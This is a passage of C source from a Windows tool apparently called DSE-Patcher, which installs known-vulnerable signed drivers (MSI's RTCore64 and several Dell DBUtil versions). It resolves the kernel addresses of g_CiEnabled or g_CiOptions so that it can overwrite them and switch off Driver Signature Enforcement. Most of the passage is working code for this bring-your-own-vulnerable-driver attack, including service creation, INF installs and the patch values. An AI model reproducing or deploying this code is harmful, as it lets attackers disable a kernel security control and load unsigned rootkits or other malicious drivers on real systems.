	return 0;
}


//------------------------------------------------------------------------------
// create and start service
//------------------------------------------------------------------------------
int MyCreateAndStartService(VULNERABLE_DRIVER *vd)
{
	int rc = 0;
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;

	// unpack vulnerable driver
	if(MyUnpackVulnerableDriver(vd->driverFile,MAX_DRIVER_FILES) != 0)
	{
		rc = 1;
		goto cleanup;
	}

	// get handle to SCM database
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager == NULL)
	{
		rc = 2;
		goto cleanup;
	}

	// get handle to service
	schService = OpenService(schSCManager,vd->szServiceName,SERVICE_ALL_ACCESS);
	if(schService == NULL)
	{
		// if we get here the service is not installed

		// create service
		schService = CreateService(schSCManager,vd->szServiceName,vd->szServiceName,SERVICE_ALL_ACCESS,SERVICE_KERNEL_DRIVER,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,vd->driverFile[0].szFilePath,NULL,NULL,NULL,NULL,NULL);
		if(schService == NULL)
		{
			rc = 3;
			goto cleanup;
		}
	}

	// query service status
	SERVICE_STATUS_PROCESS ssp;
	DWORD dwBytesNeeded;
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
	if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
	{
		rc = 4;
		goto cleanup;
	}

	// check if the service is already running
	if(ssp.dwCurrentState != SERVICE_RUNNING)
	{
		// start service
		if(StartService(schService,0,NULL) == FALSE)
		{
			rc = 5;
			goto cleanup;
		}
	}

cleanup:
	// close service handle
	if(schService != NULL) CloseServiceHandle(schService);
	// close service manager handle
	if(schSCManager != NULL) CloseServiceHandle(schSCManager);

	return rc;
}


//------------------------------------------------------------------------------
// stop and delete service
//------------------------------------------------------------------------------
int MyStopAndDeleteService(VULNERABLE_DRIVER *vd)
{
	int rc = 0;
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;

	// get handle to SCM database
	//lint -e{838} Warning 838: Previously assigned value to variable has not been used
	schSCManager = OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
	if(schSCManager == NULL)
	{
		rc = 1;
		goto cleanup;
	}

	// get handle to service
	schService = OpenService(schSCManager,vd->szServiceName,SERVICE_ALL_ACCESS);
	if(schService == NULL)
	{
		// service is not installed
		rc = 0;
		goto cleanup;
	}

	// if we get here the service is already installed, we have to stop and delete it

	// query service status
	SERVICE_STATUS_PROCESS ssp;
	DWORD dwBytesNeeded;
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
	if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
	{
		rc = 2;
		goto cleanup;
	}

	// service is not stopped already and the service can be stopped at all
	if(ssp.dwCurrentState != SERVICE_STOPPED && ssp.dwControlsAccepted & SERVICE_ACCEPT_STOP)
	{
		// service stop is pending
		if(ssp.dwCurrentState == SERVICE_STOP_PENDING)
		{
			// do this as long as the service stop is pending
			// try 10 times and wait one second in between attempts
			for(unsigned int i = 0; i < 10; i++)
			{
				// query service status
				//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
				if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
				{
					rc = 3;
					goto cleanup;
				}

				// check if service is stopped
				if(ssp.dwCurrentState == SERVICE_STOPPED)
				{
					// leave for loop
					break;
				}

				// wait one seconds before the next try
				Sleep(1000);
			}
		}

		// stop service
		if(ControlService(schService,SERVICE_CONTROL_STOP,(LPSERVICE_STATUS)&ssp) == FALSE)
		{
			rc = 4;
			goto cleanup;
		}

		// do this as long as the service is not stopped
		// try 10 times and wait one second in between attempts
		for(unsigned int i = 0; i < 10; i++)
		{
			// query service status
			//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 4) unsigned long long to unsigned long
			if(QueryServiceStatusEx(schService,SC_STATUS_PROCESS_INFO,(LPBYTE)&ssp,sizeof(SERVICE_STATUS_PROCESS),&dwBytesNeeded) == FALSE)
			{
				rc = 5;
				goto cleanup;
			}

			// check if service is stopped
			if(ssp.dwCurrentState == SERVICE_STOPPED)
			{
				// leave for loop
				break;
			}

			// wait one seconds before the next try
			Sleep(1000);
		}
	}

	// We do not check for the 10 second timeout of the for loops above. If the service is not stoppable or
	// does not stop, because some other handle is open, we should make sure to mark it for deletion. This
	// way it is deleted on the next system startup.

cleanup:
	if(schService != NULL)
	{
		// delete service
		DeleteService(schService);
		// close service handle
		CloseServiceHandle(schService);
	}

	// close service manager handle
	if(schSCManager != NULL) CloseServiceHandle(schSCManager);

	// mark registry service key for deletion
	// we do not check the return value, because it may be no service entry present at startup
	//lint -e{534} Warning 534: Ignoring return value of function
	//lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
	MyMarkServiceForDeletion((char*)vd->szServiceName);

	// delete vulnerable driver
	// we do not check the return value, because it may be no driver file present at startup
	DeleteFile(vd->driverFile[0].szFilePath);

	return rc;
}


//------------------------------------------------------------------------------
// install driver
//------------------------------------------------------------------------------
int MyInstallDriver(VULNERABLE_DRIVER *vd)
{
	int rc = 0;
	vd->DeviceInfoSet = INVALID_HANDLE_VALUE;

	// unpack vulnerable driver
	if(MyUnpackVulnerableDriver(vd->driverFile,MAX_DRIVER_FILES) != 0)
	{
		rc = 1;
		goto cleanup;
	}

	// get class of device INF file
	GUID guidClass;
	char szClassName[MAX_CLASS_NAME_LEN];
	if(SetupDiGetINFClass(vd->driverFile[1].szFilePath,&guidClass,szClassName,MAX_CLASS_NAME_LEN,NULL) == FALSE)
	{
		rc = 2;
		goto cleanup;
	}

	// create an empty device information set
	vd->DeviceInfoSet = SetupDiCreateDeviceInfoList(&guidClass,NULL);
	if(vd->DeviceInfoSet == INVALID_HANDLE_VALUE)
	{
		rc = 3;
		goto cleanup;
	}

	// create a new device information element and add it as a new member to the specified device information set
	vd->DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	if(SetupDiCreateDeviceInfo(vd->DeviceInfoSet,szClassName,&guidClass,NULL,NULL,DICD_GENERATE_ID,&vd->DeviceInfoData) == FALSE)
	{
		rc = 4;
		goto cleanup;
	}

	// zero HardwareID list
	char szHwIdList[LINE_LEN + 4];
	memset(szHwIdList,0,sizeof(szHwIdList));

	// copy HardwareID to HardwareID list
	if(lstrcpy(szHwIdList,vd->szHardwareId) == NULL)
	{
		rc = 5;
		goto cleanup;
	}
	
	// list of hardware ID's must be double zero-terminated
	DWORD dwPropertyBufferSize = (DWORD)(lstrlen(szHwIdList) + 1 + 1);
	// set HardwareID for the device's HardwareID property
	if(SetupDiSetDeviceRegistryProperty(vd->DeviceInfoSet,&vd->DeviceInfoData,SPDRP_HARDWAREID,(LPBYTE)szHwIdList,dwPropertyBufferSize) == FALSE)
	{
		rc = 6;
		goto cleanup;
	}

	// call the appropriate class installer
	// transform the registry element into an actual devnode in the PnP HW tree
	if(SetupDiCallClassInstaller(DIF_REGISTERDEVICE,vd->DeviceInfoSet,&vd->DeviceInfoData) == FALSE)
	{
		rc = 7;
		goto cleanup;
	}

	// install updated drivers for devices that match the hardware ID
	if(UpdateDriverForPlugAndPlayDevices(NULL,vd->szHardwareId,vd->driverFile[1].szFilePath,INSTALLFLAG_FORCE | INSTALLFLAG_NONINTERACTIVE,NULL) == FALSE)
	{
		// If we try to install DBUtil v2.5 on an unsupported Windows version,
		// GetLastError will return error 0xE0000244. The error text for this
		// error is: "The software was tested for compliance with Windows Logo
		// requirements on a different version of Windows, and may not be
		// compatible with this version.".
		rc = 8;
		goto cleanup;
	}

cleanup:
	// delete device information set and free all associated memory if the return code is not zero
	if(rc != 0 && vd->DeviceInfoSet != INVALID_HANDLE_VALUE)
	{
		SetupDiDestroyDeviceInfoList(vd->DeviceInfoSet);
		// set device info set to INVALID_HANDLE_VALUE
		vd->DeviceInfoSet = INVALID_HANDLE_VALUE;
	}

	return rc;
}


//------------------------------------------------------------------------------
// uninstall driver
//------------------------------------------------------------------------------
int MyUninstallDriver(VULNERABLE_DRIVER *vd)
{
	// do this for all present files in the DRIVER_FILE structure
	DRIVER_FILE *df = vd->driverFile;
	for(unsigned int i = 0; i < MAX_DRIVER_FILES; i++)
	{
		// leave for loop if file path is empty
		if(df->szFilePath[0] == 0)
		{
			break;
		}

		// delete vulnerable driver
		// do not check return code to not discard the other file deletions
		DeleteFile(df->szFilePath);

		// increment pointer to DRIVER_FILE structure to get next structure in array
		df++;
	}

	// check for zero after initialization of structure
	// If we try to uninstall the driver on startup, the device info set is zero and we return here.
	if(vd->DeviceInfoSet == 0)
	{
		return 0;
	}
	
	// check for INVALID_HANDLE_VALUE
	if(vd->DeviceInfoSet == INVALID_HANDLE_VALUE)
	{
		return 1;
	}

	// remove device
	SetupDiRemoveDevice(vd->DeviceInfoSet,&vd->DeviceInfoData);
	// delete device information set and free all associated memory
	SetupDiDestroyDeviceInfoList(vd->DeviceInfoSet);
	// set device info set to zero
	// We should not set this to INVALID_HANDLE_VALUE, because after the first run we
	// would try to uninstall the non existent driver and fail with return code 1.
	vd->DeviceInfoSet = 0;

	// get position of last backslash in driver file path
	char *p = strrchr(vd->driverFile[0].szFilePath,'\\');
	if(p == NULL)
	{
		return 2;
	}
	
	// copy driver file name after backslash position
	char szDriverFile[MAX_PATH];
	lstrcpy(szDriverFile,p + 1);

	// retrieve path of system directory
	char szSystemDriverFilePath[MAX_PATH];
	if(GetSystemDirectory(szSystemDriverFilePath,MAX_PATH) == 0)
	{
		return 3;
	}

	// build system drivers directory driver file path
	lstrcat(szSystemDriverFilePath,"\\drivers\\");
	lstrcat(szSystemDriverFilePath,szDriverFile);

	// mark registry service key for deletion
	//lint -e{1773} Warning 1773: Attempt to cast away const (or volatile)
	if(MyMarkServiceForDeletion((char*)vd->szServiceName) != 0)
	{
		return 4;
	}

	// delete driver sys file from "C:\Windows\system32\drivers" directory
	if(MyDeleteSystem32DriversFile(szSystemDriverFilePath) != 0)
	{
		return 5;
	}

	return 0;
}


//------------------------------------------------------------------------------
// initialize vulnerable driver structures
//------------------------------------------------------------------------------
int MyInitVulnerableDrivers(VULNERABLE_DRIVER *vd,DWORD dwElements)
{
	// zero vulnerable driver structures
	memset(vd,0,sizeof(VULNERABLE_DRIVER) * dwElements);

	// get executable module path
	char szPath[MAX_PATH];
	if(MyGetModulePath(szPath,MAX_PATH) != 0)
	{
		return 1;
	}

	// do this for all vulnerable drivers
	for(unsigned int i = 0; i < dwElements; i++)
	{
		// RTCore64 v4.6.2
		if(i == 0)
		{
			vd->szProvider = "RTCore64 v4.6.2 (from MSI Afterburner v4.6.2 Build 15658)";
			vd->szToolTipText = "RTCore64 v4.6.2 supports Windows Vista and later.";
			vd->pFunctionOpenDevice = MyRTCore64OpenDevice;
			vd->pFunctionReadMemory = MyRTCore64ReadMemory;
			vd->pFunctionWriteMemory = MyRTCore64WriteMemory;
			vd->pFunctionStartDriver = MyCreateAndStartService;
			vd->pFunctionStopDriver = MyStopAndDeleteService;
			vd->szServiceName = "RTCore64";
			vd->szDriverSymLink = "\\\\.\\RTCore64";
			lstrcpy(vd->driverFile[0].szFilePath,szPath);
			lstrcat(vd->driverFile[0].szFilePath,"\\RTCore64.sys");
			vd->driverFile[0].bData = RTCore64Driver;
			vd->driverFile[0].dwSize = sizeof(RTCore64Driver);
			// supports Windows Vista and later
			vd->dwMinSupportedBuildNumber = 6000;
			vd->dwMaxSupportedBuildNumber = 0xFFFFFFFF;
		}
		// DBUtil v2.3
		else if(i == 1)
		{
			vd->szProvider = "DBUtil v2.3 (from Dell OptiPlex 7070 v1.0.2 BIOS Update)";
			vd->szToolTipText = "DBUtil v2.3 supports Windows Vista and later up to\nWindows 11 Build 21H2.\n\nAttention:\nThe driver does not support Windows 11 Build 22H2,\nbecause the driver blocklist is updated by Microsoft.\n\nThe driver can only be manually deleted on Windows 10\nafter a reboot, because it is not stoppable and running.\nOn Windows 7 the deletion works without any problems.";
			vd->pFunctionOpenDevice = MyDBUtilOpenDevice;
			vd->pFunctionReadMemory = MyDBUtilReadMemory;
			vd->pFunctionWriteMemory = MyDBUtilWriteMemory;
			vd->pFunctionStartDriver = MyCreateAndStartService;
			vd->pFunctionStopDriver = MyStopAndDeleteService;
			vd->szServiceName = "DBUtil_2_3";
			vd->szDriverSymLink = "\\\\.\\DBUtil_2_3";
			lstrcpy(vd->driverFile[0].szFilePath,szPath);
			lstrcat(vd->driverFile[0].szFilePath,"\\DBUtil_2_3.Sys");
			vd->driverFile[0].bData = DBUtil_v23_sys;
			vd->driverFile[0].dwSize = sizeof(DBUtil_v23_sys);
			// supports Windows Vista and later up to Windows 11 Build 21H2, does not support Windows 11 Build 22H2
			vd->dwMinSupportedBuildNumber = 6000;
			vd->dwMaxSupportedBuildNumber = 22000;
		}
		// DBUtil v2.5
		else if(i == 2)
		{
			vd->szProvider = "DBUtil v2.5 (from Dell OptiPlex 7070 v1.7.0 BIOS Update)";
			vd->szToolTipText = "DBUtil v2.5 supports Windows 10 version 1507 and later.\n\nAttention:\nThe driver does not install on older OSs, because the\ndependent KMDF library version 1.15 is not present.";
			vd->pFunctionOpenDevice = MyDBUtilOpenDevice;
			vd->pFunctionReadMemory = MyDBUtilReadMemory;
			vd->pFunctionWriteMemory = MyDBUtilWriteMemory;
			vd->pFunctionStartDriver = MyInstallDriver;
			vd->pFunctionStopDriver = MyUninstallDriver;
			vd->szServiceName = "DBUtilDrv2";
			vd->szDriverSymLink = "\\\\.\\DBUtil_2_5";

			// the 1st file is always the driver sys file
			lstrcpy(vd->driverFile[0].szFilePath,szPath);
			lstrcat(vd->driverFile[0].szFilePath,"\\DBUtilDrv2.sys");
			vd->driverFile[0].bData = DBUtil_v25_sys;
			vd->driverFile[0].dwSize = sizeof(DBUtil_v25_sys);

			// the 2nd file is always the driver inf file
			lstrcpy(vd->driverFile[1].szFilePath,szPath);
			lstrcat(vd->driverFile[1].szFilePath,"\\dbutildrv2.inf");
			vd->driverFile[1].bData = DBUtil_v25_inf;
			vd->driverFile[1].dwSize = sizeof(DBUtil_v25_inf);

			// the 3rd file is always the driver cat file
			lstrcpy(vd->driverFile[2].szFilePath,szPath);
			lstrcat(vd->driverFile[2].szFilePath,"\\DBUtilDrv2.cat");
			vd->driverFile[2].bData = DBUtil_v25_cat;
			vd->driverFile[2].dwSize = sizeof(DBUtil_v25_cat);			

			// we need the hardware ID for the INF install
			vd->szHardwareId = "ROOT\\DBUtilDrv2";

			// supports Windows 10 version 1507 and later
			vd->dwMinSupportedBuildNumber = 10240;
			vd->dwMaxSupportedBuildNumber = 0xFFFFFFFF;
		}
		// DBUtil v2.6
		else if(i == 3)
		{
			vd->szProvider = "DBUtil v2.6 (from Dell OptiPlex 7070 v1.7.2 BIOS Update)";
			vd->szToolTipText = "DBUtil v2.6 supports Windows 10 version 1507 and later.\n\nAttention:\nThe driver does not install on older OSs, because the\ndependent KMDF library version 1.15 is not present.";
			vd->pFunctionOpenDevice = MyDBUtilOpenDevice;
			vd->pFunctionReadMemory = MyDBUtilReadMemory;
			vd->pFunctionWriteMemory = MyDBUtilWriteMemory;
			vd->pFunctionStartDriver = MyInstallDriver;
			vd->pFunctionStopDriver = MyUninstallDriver;
			vd->szServiceName = "DBUtilDrv2";
			// Attention: DBUtil v2.6 has the device name "\\.\DBUtil_2_5". This is the same device name as in version 2.5!
			vd->szDriverSymLink = "\\\\.\\DBUtil_2_5";

			// the 1st file is always the driver sys file
			lstrcpy(vd->driverFile[0].szFilePath,szPath);
			lstrcat(vd->driverFile[0].szFilePath,"\\DBUtilDrv2.sys");
			vd->driverFile[0].bData = DBUtil_v26_sys;
			vd->driverFile[0].dwSize = sizeof(DBUtil_v26_sys);

			// the 2nd file is always the driver inf file
			lstrcpy(vd->driverFile[1].szFilePath,szPath);
			lstrcat(vd->driverFile[1].szFilePath,"\\dbutildrv2.inf");
			vd->driverFile[1].bData = DBUtil_v26_inf;
			vd->driverFile[1].dwSize = sizeof(DBUtil_v26_inf);

			// the 3rd file is always the driver cat file
			lstrcpy(vd->driverFile[2].szFilePath,szPath);
			lstrcat(vd->driverFile[2].szFilePath,"\\DBUtilDrv2.cat");
			vd->driverFile[2].bData = DBUtil_v26_cat;
			vd->driverFile[2].dwSize = sizeof(DBUtil_v26_cat);			

			// we need the hardware ID for the INF install
			vd->szHardwareId = "ROOT\\DBUtilDrv2";

			// supports Windows 10 version 1507 and later
			vd->dwMinSupportedBuildNumber = 10240;
			vd->dwMaxSupportedBuildNumber = 0xFFFFFFFF;
		}
		// DBUtil v2.7
		else if(i == 4)
		{
			vd->szProvider = "DBUtil v2.7 (from Dell OptiPlex 7070 v1.10.0 BIOS Update)";
			vd->szToolTipText = "DBUtil v2.7 supports Windows 8 and later.\n\nAttention:\nTo install the driver on Windows 7 with Service Pack 1\nyou have to apply the Windows update KB3033929\nfor SHA256 support.";
			vd->pFunctionOpenDevice = MyDBUtilOpenDevice;
			vd->pFunctionReadMemory = MyDBUtilReadMemory;
			vd->pFunctionWriteMemory = MyDBUtilWriteMemory;
			vd->pFunctionStartDriver = MyInstallDriver;
			vd->pFunctionStopDriver = MyUninstallDriver;
			vd->szServiceName = "DBUtilDrv2";
			// Attention: DBUtil v2.7 has the device name "\\.\DBUtil_2_5". This is the same device name as in version 2.5!
			vd->szDriverSymLink = "\\\\.\\DBUtil_2_5";

			// the 1st file is always the driver sys file
			lstrcpy(vd->driverFile[0].szFilePath,szPath);
			lstrcat(vd->driverFile[0].szFilePath,"\\DBUtilDrv2.sys");
			vd->driverFile[0].bData = DBUtil_v27_sys;
			vd->driverFile[0].dwSize = sizeof(DBUtil_v27_sys);

			// the 2nd file is always the driver inf file
			lstrcpy(vd->driverFile[1].szFilePath,szPath);
			lstrcat(vd->driverFile[1].szFilePath,"\\dbutildrv2.inf");
			vd->driverFile[1].bData = DBUtil_v27_inf;
			vd->driverFile[1].dwSize = sizeof(DBUtil_v27_inf);

			// the 3rd file is always the driver cat file
			lstrcpy(vd->driverFile[2].szFilePath,szPath);
			lstrcat(vd->driverFile[2].szFilePath,"\\DBUtilDrv2.cat");
			vd->driverFile[2].bData = DBUtil_v27_cat;
			vd->driverFile[2].dwSize = sizeof(DBUtil_v27_cat);			
			
			// the 4th file is always the driver WdfCoInstaller DLL file
			lstrcpy(vd->driverFile[3].szFilePath,szPath);
			lstrcat(vd->driverFile[3].szFilePath,"\\WdfCoInstaller01009.dll");
			vd->driverFile[3].bData = DBUtil_v27_WdfCI;
			vd->driverFile[3].dwSize = sizeof(DBUtil_v27_WdfCI);			

			// we need the hardware ID for the INF install
			vd->szHardwareId = "ROOT\\DBUtilDrv2";

			// supports Windows 8 and later, Windows 7 is only supported if the SHA256 update patch KB3033929 is installed
			vd->dwMinSupportedBuildNumber = 9200;
			vd->dwMaxSupportedBuildNumber = 0xFFFFFFFF;
		}

		// increment pointer to VULNERABLE_DRIVER structure to get next structure in array
		vd++;
	}

	return 0;
}


//------------------------------------------------------------------------------
// update static control with patch data
//------------------------------------------------------------------------------
void MyUpdateStaticControlWithPatchData(PATCH_DATA *pd,THREAD_TASK_NO ttno,HWND hStatic)
{
	// zero temporary string buffer
	char szTmp[1024];
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 3) int to unsigned long long
	memset(szTmp,0,1024);

	// patch size is 1 byte for Windows Vista and Windows 7
	if(pd->dwPatchSize == 1)
	{
		// on the first run the values "DSE Original Value", "DSE Actual Value" and "DSE Status" are unknown
		if(ttno == ThreadTaskReadDSEOnFirstRun && pd->szDSEStatus == NULL)
		{
			// build patch data string for static control
			sprintf(szTmp,
			"----------------------------------------------\n"
			"                DSE Patch Data\n"
			"----------------------------------------------\n"
			"Operating System   : %s\n"
			"Module Name        : %s\n"
			"Variable Name      : %s\n"
			"DSE Original Value : unknown\n"
			"DSE Disable Value  : 0x%.02lX\n"
			"DSE Enable Value   : 0x%.02lX\n"
			"DSE Actual Value   : unknown\n"
			"Patch Size         : %.01lu byte\n"
			"Image Base         : 0x%.16I64X\n"
			"Image Size         : 0x%.08lX bytes\n"
			"Patch Address      : 0x%.16I64X\n"
			"DSE Status         : unknown"
			,pd->szOS,pd->szModuleName,pd->szVariableName,pd->dwDSEDisableValue,pd->dwDSEEnableValue
			,pd->dwPatchSize,pd->ui64ImageBase,pd->ulImageSize,pd->ui64PatchAddress);
		}
		// from the 2nd run onwards we should have the values "DSE Original Value", "DSE Actual Value" and "DSE Status"
		else
		{
			// build patch data string for static control
			sprintf(szTmp,
			"----------------------------------------------\n"
			"                DSE Patch Data\n"
			"----------------------------------------------\n"
			"Operating System   : %s\n"
			"Module Name        : %s\n"
			"Variable Name      : %s\n"
			"DSE Original Value : 0x%.02lX\n"
			"DSE Disable Value  : 0x%.02lX\n"
			"DSE Enable Value   : 0x%.02lX\n"
			"DSE Actual Value   : 0x%.02lX\n"
			"Patch Size         : %.01lu byte\n"
			"Image Base         : 0x%.16I64X\n"
			"Image Size         : 0x%.08lX bytes\n"
			"Patch Address      : 0x%.16I64X\n"
			"DSE Status         : %s"
			,pd->szOS,pd->szModuleName,pd->szVariableName,pd->dwDSEOriginalValue,pd->dwDSEDisableValue,pd->dwDSEEnableValue
			,pd->dwDSEActualValue,pd->dwPatchSize,pd->ui64ImageBase,pd->ulImageSize,pd->ui64PatchAddress,pd->szDSEStatus);
		}
	}
	// patch size is 4 bytes for Windows 8 and later
	else
	{
		// on the first run the values "DSE Original Value", "DSE Actual Value" and "DSE Status" are unknown
		if(ttno == ThreadTaskReadDSEOnFirstRun && pd->szDSEStatus == NULL)
		{
			// build patch data string for static control
			sprintf(szTmp,
			"----------------------------------------------\n"
			"                DSE Patch Data\n"
			"----------------------------------------------\n"
			"Operating System   : %s\n"
			"Module Name        : %s\n"
			"Variable Name      : %s\n"
			"DSE Original Value : unknown\n"
			"DSE Disable Value  : 0x%.08lX\n"
			"DSE Enable Value   : 0x%.08lX\n"
			"DSE Actual Value   : unknown\n"
			"Patch Size         : %.01lu bytes\n"
			"Image Base         : 0x%.16I64X\n"
			"Image Size         : 0x%.08lX bytes\n"
			"Patch Address      : 0x%.16I64X\n"
			"DSE Status         : unknown"
			,pd->szOS,pd->szModuleName,pd->szVariableName,pd->dwDSEDisableValue,pd->dwDSEEnableValue
			,pd->dwPatchSize,pd->ui64ImageBase,pd->ulImageSize,pd->ui64PatchAddress);
		}
		// from the 2nd run onwards we should have the values "DSE Original Value", "DSE Actual Value" and "DSE Status"
		else
		{
			// build patch data string for static control
			sprintf(szTmp,
			"----------------------------------------------\n"
			"                DSE Patch Data\n"
			"----------------------------------------------\n"
			"Operating System   : %s\n"
			"Module Name        : %s\n"
			"Variable Name      : %s\n"
			"DSE Original Value : 0x%.08lX\n"
			"DSE Disable Value  : 0x%.08lX\n"
			"DSE Enable Value   : 0x%.08lX\n"
			"DSE Actual Value   : 0x%.08lX\n"
			"Patch Size         : %.01lu bytes\n"
			"Image Base         : 0x%.16I64X\n"
			"Image Size         : 0x%.08lX bytes\n"
			"Patch Address      : 0x%.16I64X\n"
			"DSE Status         : %s"
			,pd->szOS,pd->szModuleName,pd->szVariableName,pd->dwDSEOriginalValue,pd->dwDSEDisableValue,pd->dwDSEEnableValue
			,pd->dwDSEActualValue,pd->dwPatchSize,pd->ui64ImageBase,pd->ulImageSize,pd->ui64PatchAddress,pd->szDSEStatus);
		}
	}

	// update static control with patch data string
	SendMessage(hStatic,WM_SETTEXT,(WPARAM)0,(LPARAM)szTmp);

	return;
}


//------------------------------------------------------------------------------
// thread function for better GUI interaction
//------------------------------------------------------------------------------
DWORD WINAPI MyThreadProc1(PVOID pvoid)
{
	DWORD rc = 0;

	// get thread parameters
	THREAD_PARAMS *tp = (THREAD_PARAMS*)pvoid;

	// zero timer vars
	g.Dlg1.uiTimerHours = 0;
	g.Dlg1.uiTimerMinutes = 0;
	g.Dlg1.uiTimerSeconds = 0;

	// reset status bar pane 1 text to empty string
	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"");
	// set pane 2 status bar text to initial timer value
	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)1,(LPARAM)"00:00:00");

	// start timer
	//lint -e{747} Warning 747: Significant prototype coercion (arg. no. 2) int to unsigned long long
	SetTimer(g.Dlg1.hDialog1,1,1000,0);

	// disable controls
	//lint -e{534} Warning 534: Ignoring return value of function
	MyDlg1EnableControls(0);

	// check vulnerable driver combo box selection
	int sel = (int)SendMessage(g.Dlg1.hCombo1,CB_GETCURSEL,(WPARAM)0,(LPARAM)0);
	if(sel == CB_ERR)
	{
		MessageBox(g.Dlg1.hDialog1,"No vulnerable driver selected!","Error",16);
		rc = 1;
		goto cleanup;
	}

	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Getting Windows version...");

	// get operating system version
	// Attention: We do not use GetVersion or GetVersionEx API, because with the
	// release of Windows 8.1 the value returned by the GetVersion and GetVersionEx
	// function now depends on how the application is manifested.
	OSVERSIONINFO osvi;
	if(MyRtlGetVersion(&osvi) != 0)
	{
		MessageBox(g.Dlg1.hDialog1,"Can't retrieve operating system version!","Error",16);
		rc = 2;
		goto cleanup;
	}

	// check for Windows Vista (build number 6000) or later
	if(osvi.dwBuildNumber < 6000)
	{
		MessageBox(g.Dlg1.hDialog1,"DSE-Patcher requires Windows Vista or later!","Error",16);
		rc = 3;
		goto cleanup;
	}

	// check for Windows Vista or Windows 7
	if(osvi.dwBuildNumber < 9200)
	{
		// if we get here Windows Vista or Windows 7 are running
		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Windows Vista or Windows 7 detected");

		// fill patch data structure for Windows Vista and Windows 7
		g.pd.szOS = "Windows Vista / Windows 7";
		g.pd.szModuleName = "NTOSKRNL.EXE";
		g.pd.szVariableName = "g_CiEnabled";
		g.pd.dwDSEDisableValue = 0;
		g.pd.dwDSEEnableValue = 1;
		g.pd.dwPatchSize = 1;

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Getting image base of NTOSKRNL.EXE...");

		// get image base of module NTOSKRNL.EXE in kernel address space
		if(MyGetImageBaseInKernelAddressSpace(g.pd.szModuleName,&g.pd.ui64ImageBase,&g.pd.ulImageSize) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't get image base of NTOSKRNL.EXE!","Error",16);
			rc = 4;
			goto cleanup;
		}

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Getting kernel address of g_CiEnabled...");

		// get g_CiEnabled kernel address
		if(MyGetg_CiEnabledKernelAddress(g.pd.ui64ImageBase,g.pd.ulImageSize,&g.pd.ui64PatchAddress) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't get kernel address of g_CiEnabled!","Error",16);
			rc = 5;
			goto cleanup;
		}
	}
	// build number 9200 and above is Windows 8 or later
	else
	{
		// if we get here Windows 8 or later is running
		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Windows 8 or later detected");

		// fill patch data structure for Windows 8 or later
		g.pd.szOS = "Windows 8 or later";
		g.pd.szModuleName = "CI.DLL";
		g.pd.szVariableName = "g_CiOptions";
		g.pd.dwDSEDisableValue = 0;
		g.pd.dwDSEEnableValue = 6;
		g.pd.dwPatchSize = 4;

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Getting image base of CI.DLL...");

		// get image base of module CI.DLL in kernel address space
		if(MyGetImageBaseInKernelAddressSpace(g.pd.szModuleName,&g.pd.ui64ImageBase,&g.pd.ulImageSize) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't get image base of CI.DLL!","Error",16);
			rc = 6;
			goto cleanup;
		}

		SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Getting kernel address of g_CiOptions...");

		// get g_CiOptions kernel address
		if(MyGetg_CiOptionsKernelAddress(g.pd.ui64ImageBase,&g.pd.ui64PatchAddress,osvi.dwBuildNumber) != 0)
		{
			MessageBox(g.Dlg1.hDialog1,"Can't get kernel address of g_CiOptions!","Error",16);
			rc = 7;
			goto cleanup;
		}
	}

	// update static control with patch data
	MyUpdateStaticControlWithPatchData(&g.pd,tp->ttno,g.Dlg1.hStatic1);

	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Checking selected driver support on this Windows version...");

	// check if the selected driver is supported on this Windows version
	if(osvi.dwBuildNumber < g.vd[sel].dwMinSupportedBuildNumber || osvi.dwBuildNumber > g.vd[sel].dwMaxSupportedBuildNumber)
	{
		// ask user if he wants to continue if the selected driver is not supported on this Windows version
		if(MessageBox(g.Dlg1.hDialog1,"The selected driver is not supported on this Windows version!\nDo you want to continue?","Question",MB_YESNO | MB_ICONQUESTION) == IDNO)
		{
			// leave
			SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Aborted by user due to unsupported Windows version");
			rc = 8;
			goto cleanup;
		}
	}

	SendMessage(g.Dlg1.hStatusBar1,SB_SETTEXT,(WPARAM)0,(LPARAM)"Stopping and deleting service...");

	// stop and delete service
	if(g.vd[sel].pFunctionStopDriver(&g.vd[sel]) != 0)
	{
